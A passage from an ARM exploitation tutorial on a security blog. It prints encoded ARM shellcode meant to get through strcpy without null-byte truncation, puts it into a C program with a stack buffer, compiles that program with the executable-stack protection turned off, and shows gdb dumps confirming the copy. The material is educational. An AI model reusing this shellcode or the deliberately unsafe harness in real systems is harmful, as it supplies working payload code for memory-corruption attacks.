<p>\x30\x60\xa0\xe3\x0f\x10\xa0\xe1\x2c\x10\x81\xe2\x04\x40\x44\xe0\x30\xd0\x4d\xe2\x0d\x30\xa0\xe1\x04\x20\xd1\xe7\x01\x20\x42\xe2\x04\x20\xc3\xe7\x01\x40\x84\xe2\x04\x50\x56\xe0\xf9\xff\xff\xca\x38\xd0\x8d\xe2\x33\xff\x2f\xe1\x10\x01\xa1\xe2\x21\x01\x81\xe3\x03\x21\x43\xe1\x06\x01\x2e\xea\x0e\x11\xa1\xe2\x0c\x71\xa1\xe4\x01\x01\x01\xf0\x01\x01\xa1\xe4\x02\x71\xa1\xe4\x01\x01\x01\xf0\x30\x63\x6a\x6f\x30\x74\x69\x01</p>
<p>Now we can test it (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/encode_shellcode/encode_shellcode_after.c" target="_blank" rel="external">encode_shellcode_after.c</a><br>)</p>
<p>#include <stdio.h></stdio.h></p>
<p>#include <string.h></string.h></p>
<p>char *msg = “\x30\x60\xa0\xe3\x0f\x10\xa0\xe1\x2c\x10\x81\xe2\x04\x40\x44\xe0\x30\xd0\x4d\xe2\x0d\x30\xa0\xe1\x04\x20\xd1\xe7\x01\x20\x42\xe2\x04\x20\xc3\xe7\x01\x40\x84\xe2\x04\x50\x56\xe0\xf9\xff\xff\xca\x38\xd0\x8d\xe2\x33\xff\x2f\xe1\x10\x01\xa1\xe2\x21\x01\x81\xe3\x03\x21\x43\xe1\x06\x01\x2e\xea\x0e\x11\xa1\xe2\x0c\x71\xa1\xe4\x01\x01\x01\xf0\x01\x01\xa1\xe4\x02\x71\xa1\xe4\x01\x01\x01\xf0\x30\x63\x6a\x6f\x30\x74\x69\x01”;</p>
<p>void message(){</p>
<p>  char msg_buf[120]={0};</p>
<p>  strcpy(msg_buf, msg);<br>}</p>
<p>int main(int argc, char **argv){</p>
<p>  message();</p>
<p>  printf(“Good bye!\n”);</p>
<p>  return 0;</p>
<p>}</p>
<p>Compile it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o encode_shellcode_after encode_shellcode_after.c -g -z execstack</p>
<p>And if we start the debugger and take look at the variable<br>msg_buf<br> after the<br>strcpy<br> function</p>
<p>gdb&gt; x/104bx msg</p>
<p>0x1059c: 0x30 0x60 0xa0 0xe3 0x0f 0x10 0xa0 0xe1</p>
<p>0x105a4: 0x2c 0x10 0x81 0xe2 0x04 0x40 0x44 0xe0</p>
<p>0x105ac: 0x30 0xd0 0x4d 0xe2 0x0d 0x30 0xa0 0xe1</p>
<p>0x105b4: 0x04 0x20 0xd1 0xe7 0x01 0x20 0x42 0xe2</p>
<p>0x105bc: 0x04 0x20 0xc3 0xe7 0x01 0x40 0x84 0xe2</p>
<p>0x105c4: 0x04 0x50 0x56 0xe0 0xf9 0xff 0xff 0xca</p>
<p>0x105cc: 0x38 0xd0 0x8d 0xe2 0x33 0xff 0x2f 0xe1</p>
<p>0x105d4: 0x10 0x01 0xa1 0xe2 0x21 0x01 0x81 0xe3</p>
<p>0x105dc: 0x03 0x21 0x43 0xe1 0x06 0x01 0x2e 0xea</p>
<p>0x105e4: 0x0e 0x11 0xa1 0xe2 0x0c 0x71 0xa1 0xe4</p>
<p>0x105ec: 0x01 0x01 0x01 0xf0 0x01 0x01 0xa1 0xe4</p>
<p>0x105f4: 0x02 0x71 0xa1 0xe4 0x01 0x01 0x01 0xf0</p>
<p>0x105fc: 0x30 0x63 0x6a 0x6f 0x30 0x74 0x69 0x01</p>
<p>gdb&gt; x/104bx msg_buf</p>
<p>0x7efff5e0: 0x30 0x60 0xa0 0xe3 0x0f 0x10 0xa0 0xe1</p>
<p>0x7efff5e8: 0x2c 0x10 0x81 0xe2 0x04 0x40 0x44 0xe0</p>
<p>0x7efff5f0: 0x30 0xd0 0x4d 0xe2 0x0d 0x30 0xa0 0xe1</p>
<p>0x7efff5f8: 0x04 0x20 0xd1 0xe7 0x01 0x20 0x42 0xe2</p>
<p>0x7efff600: 0x04 0x20 0xc3 0xe7 0x01 0x40 0x84 0xe2</p>
<p>0x7efff608: 0x04 0x50 0x56 0xe0 0xf9 0xff 0xff 0xca</p>
<p>0x7efff610: 0x38 0xd0 0x8d 0xe2 0x33 0xff 0x2f 0xe1</p>
<p>0x7efff618: 0x10 0x01 0xa1 0xe2 0x21 0x01 0x81 0xe3</p>
<p>0x7efff620: 0x03 0x21 0x43 0xe1 0x06 0x01 0x2e 0xea</p>
<p>0x7efff628: 0x0e 0x11 0xa1 0xe2 0x0c 0x71 0xa1 0xe4</p>
<p>0x7efff630: 0x01 0x01 0x01 0xf0 0x01 0x01 0xa1 0xe4</p>
<p>0x7efff638: 0x02 0x71 0xa1 0xe4 0x01 0x01 0x01 0xf0</p>
<p>0x7efff640: 0x30 0x63 0x6a 0x6f 0x30 0x74 0x69 0x01</p>
<p>We can note that all the bytes were finally copied.</p>
<p>See you at the next episode 🙂</p>
<p><a href="https://twitter.com/invictus1306" target="_blank" rel="external">@invictus1306</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2017/11/06/IoT设备通信安全讨论/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">IoT设备通信安全讨论</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->
</section>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2017 物联网安全技术研究 All Rights Reserved.
          
            <span id="busuanzi_container_site_uv">
              本站访客数<span id="busuanzi_value_site_uv"></span>人次  
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
            </span>
          
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var contentdiv = document.getElementById("content");

    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">主页</a>
  
    <a href="/books" class="mobile-nav-link">书籍</a>
  
    <a href="/tools" class="mobile-nav-link">工具</a>
  
    <a href="/about" class="mobile-nav-link">关于</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
